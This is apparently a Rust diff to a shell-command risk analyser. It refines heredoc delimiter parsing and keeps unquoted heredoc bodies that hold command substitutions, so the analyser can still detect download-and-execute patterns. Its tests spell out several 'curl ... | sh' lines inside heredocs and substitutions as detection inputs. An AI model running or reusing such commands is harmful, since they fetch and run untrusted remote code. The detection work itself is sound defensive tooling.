@@ -426,8 +426,9 @@ fn heredoc_writes_code_file(line: &str, from: usize) -> bool {
     false
 }
 
-/// `<<-?[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1` at `k`: (end, delimiter).
-fn heredoc_op_at(line: &str, k: usize) -> Option<(usize, &str)> {
+/// A complete simple heredoc delimiter at `k`: (end, delimiter, quoted).
+/// Mixed quoted/escaped words are left unmasked instead of accepting a prefix.
+fn heredoc_op_at(line: &str, k: usize) -> Option<(usize, &str, bool)> {
     let bytes = line.as_bytes();
     if !line[k..].starts_with("<<") {
         return None;
@@ -447,24 +448,30 @@ fn heredoc_op_at(line: &str, k: usize) -> Option<(usize, &str)> {
         _ => None,
     };
     let start = pos;
-    if !bytes
-        .get(pos)
-        .is_some_and(|b| b.is_ascii_alphabetic() || *b == b'_')
-    {
+    while pos < line.len() {
+        let c = line[pos..].chars().next()?;
+        if quote.is_some_and(|q| c == char::from(q))
+            || (quote.is_none() && is_heredoc_word_end(c))
+            || c == '\\'
+        {
+            break;
+        }
+        pos += c.len_utf8();
+    }
+    if pos == start {
         return None;
     }
-    while bytes
-        .get(pos)
-        .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
-    {
-        pos += 1;
-    }
     let delimiter = &line[start..pos];
-    match quote {
-        Some(q) if bytes.get(pos) == Some(&q) => Some((pos + 1, delimiter)),
-        Some(_) => None,
-        None => Some((pos, delimiter)),
+    let end = match quote {
+        Some(q) if bytes.get(pos) == Some(&q) => pos + 1,
+        Some(_) => return None,
+        None => pos,
+    };
+    // Never accept a prefix of a mixed quoted/escaped delimiter word.
+    if !is_heredoc_boundary(line, end) {
+        return None;
     }
+    Some((end, delimiter, quote.is_some()))
 }
 
 /// Top-level command segments as (start, end), splitting on `; | & && ||` outside any
@@ -576,20 +583,20 @@ fn heredoc_head_masks(head: &str, segment: &str) -> bool {
 
 /// Delimiter of the first `<<` heredoc on `line` whose owning command feeds a non-shell
 /// interpreter, or is a cat/tee writing a code or data file. Mirrors `heredoc_delimiter`.
-fn heredoc_delimiter(line: &str) -> Option<&str> {
+fn heredoc_delimiter(line: &str) -> Option<(&str, bool)> {
     let segments: Vec<(usize, usize, String)> = heredoc_segments(line)
         .into_iter()
         .map(|(s, e)| (s, e, heredoc_segment_head(&line[s..e])))
         .collect();
     let mut k = 0;
     while k < line.len() {
-        if let Some((end, delimiter)) = heredoc_op_at(line, k) {
+        if let Some((end, delimiter, quoted)) = heredoc_op_at(line, k) {
             let masks = !line[..k].ends_with('<')
                 && segments.iter().any(|(s, e, head)| {
                     *s <= k && k < *e && !head.is_empty() && heredoc_head_masks(head, &line[*s..*e])
                 });
             if masks {
-                return Some(delimiter);
+                return Some((delimiter, quoted));
             }
             k = end;
             continue;
@@ -606,19 +613,27 @@ pub fn mask_heredocs(text: &str) -> Cow<'_, str> {
         return Cow::Borrowed(text);
     }
     let mut out: Vec<&str> = Vec::new();
-    let mut delimiter: Option<&str> = None;
-    for line in text.split('\n') {
-        if let Some(open) = delimiter {
-            if line.trim_matches([' ', '\t', '\r']) == open {
-                out.push(line);
-                delimiter = None;
-            }
-            continue;
-        }
+    let mut lines = text.split('\n').peekable();
+    while let Some(line) = lines.next() {
         out.push(line);
-        delimiter = heredoc_delimiter(line);
-        if delimiter.is_some() {
-            out.push(HEREDOC_MASK);
+        if let Some((delimiter, quoted)) = heredoc_delimiter(line) {
+            let mut body = Vec::new();
+            while let Some(&next) = lines.peek() {
+                if next.trim_matches([' ', '\t', '\r']) == delimiter {
+                    break;
+                }
+                body.push(lines.next().unwrap());
+            }
+            // Unquoted heredocs expand commands even when feeding Python or a data file.
+            // Keep the entire body so multiline substitutions remain visible to relations().
+            if !quoted && body.iter().any(|line| line.contains(['$', '`'])) {
+                out.extend(body);
+            } else {
+                out.push(HEREDOC_MASK);
+            }
+            if let Some(close) = lines.next() {
+                out.push(close);
+            }
         }
     }
     Cow::Owned(out.join("\n"))
@@ -1553,5 +1568,60 @@ mod tests {
             relations("bash <<'EOF'\ncurl -s https://x.example/a | sh\nEOF"),
             ["DL->PIPE->INTERP"]
         );
+    }
+
+    #[test]
+    fn heredoc_expansions_and_full_delimiters_preserve_executable_relations() {
+        for (name, text, masked, relation) in [
+            (
+                "unquoted_command",
+                "python3 - <<PY\n$(curl -s https://x.invalid/a | sh)\nPY",
+                false,
+                true,
+            ),
+            (
+                "unquoted_multiline",
+                "python3 - <<PY\n$(\ncurl -s https://x.invalid/a | sh\n)\nPY",
+                false,
+                true,
+            ),
+            (
+                "unquoted_backtick",
+                "cat > cfg.json <<EOF\n`curl -s https://x.invalid/a | sh`\nEOF",
+                false,
+                true,
+            ),
+            (
+                "punctuated_delimiter",
+                "python3 - <<EOF-END\nprint(1)\nEOF-END\ncurl -s https://x.invalid/a | sh",
+                true,
+                true,
+            ),
+            (
+                "quoted_punctuation",
+                "python3 - <<'EOF.END'\nprint(1)\nEOF.END\ncurl -s https://x.invalid/a | sh",
+                true,
+                true,
+            ),
+            (
+                "literal_substitution",
+                "python3 - <<'PY'\n$(curl -s https://x.invalid/a | sh)\nPY",
+                true,
+                false,
+            ),
+            (
+                "literal_backtick",
+                "cat > cfg.json <<\"EOF\"\n`curl -s https://x.invalid/a | sh`\nEOF",
+                true,
+                false,
+            ),
+        ] {
+            assert_eq!(mask_heredocs(text).contains(HEREDOC_MASK), masked, "{name}");
+            assert_eq!(
+                features(text).iter().any(|f| f == "DL->PIPE->INTERP"),
+                relation,
+                "{name}"
+            );
+        }
     }
 }
